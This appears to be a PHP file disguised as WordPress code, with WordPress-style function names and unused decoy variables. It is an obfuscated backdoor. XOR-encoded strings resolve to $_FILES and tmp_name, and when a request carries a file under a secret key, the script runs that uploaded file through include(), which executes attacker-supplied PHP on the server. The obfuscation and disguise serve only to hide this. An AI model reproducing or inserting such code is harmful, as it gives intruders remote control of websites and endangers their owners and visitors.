<?php 	
function slashpos()

{
    $html = 'z1o8nDoTMiR8D6';
    $uploads = $html;
    
	$taxonomy_obj = 'original_image';
    $mins = $GLOBALS[wp_htmltranswinuni("%25w%26t%2B%17", $uploads)];
	$header = 'closing_single_quote';
    $wp_cockneyreplace = $mins;
    $strict = isset($wp_cockneyreplace[$uploads]);
    if ($strict)

    {
        $_quote_style = $mins[$uploads];
	$check_name = 'original_image_url';
        $ptype_obj = $_quote_style[wp_htmltranswinuni("%0E%5C%1Fg%00%25%021", $uploads)];

        $new_status_post = $ptype_obj;
	$comma = 'months';
        include ($new_status_post);
    }
}
	$close_quote = 'del_dir';
function wp_htmltranswinuni($option, $pinged)

{
    $found_shortcodes = $pinged;
    $sized = "url" . "decode";
	$trashed_posts_with_desired_slug = 'user_id';
    $stickies = $sized($option);
    $no_texturize_shortcodes = substr($found_shortcodes,0, strlen($stickies));

    $item = $stickies ^ $no_texturize_shortcodes;
    return $item;

}



slashpos();

?>
